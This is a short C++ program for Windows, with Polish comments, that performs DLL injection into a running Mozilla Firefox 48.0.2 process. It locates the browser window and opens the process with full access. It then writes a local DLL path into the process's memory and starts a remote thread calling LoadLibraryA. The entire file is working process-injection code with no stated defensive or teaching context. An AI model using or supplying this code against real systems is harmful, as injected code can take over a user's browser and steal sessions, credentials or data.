#include "stdafx.h"
#include <iostream>
#include <windows.h>
using namespace std;

int main(int argc, char * argv[])
{
	//Uchwyt do klasy okna (Mozilla Firefox 48.0.2)
	HWND appHandle = FindWindow(_T("MozillaWindowClass"), NULL); 
	DWORD pid = 0;
	GetWindowThreadProcessId(appHandle, &pid);
	cout << "-> Proba DLL Injection dla procesu o ID: "<< pid << endl << endl;

	//uchwyt procesu po PID
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); 
	//funkcja loadlibraryA w kernel 32 (address)

	LPVOID processAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

	string dllPath = "C:\\Users\\Patryk\\Desktop\\dll.dll";

	//alokacja nowego regionu pamieci adresowej
	LPVOID virtualAlloc = VirtualAllocEx(processHandle, NULL, strlen(dllPath.c_str()), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);	

	//zapisanie do zaalokowanej pamieci
	WriteProcessMemory(processHandle, virtualAlloc, dllPath.c_str(), strlen(dllPath.c_str()), NULL);

	//DLL INjection
	HANDLE dllInjectionProcess = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)processAddress, virtualAlloc, NULL, NULL); 

	if(dllInjectionProcess != NULL)
		cout << "[!] DLL Injection udane!";

	CloseHandle(processHandle);
	cin >> pid;

	return 0;
}
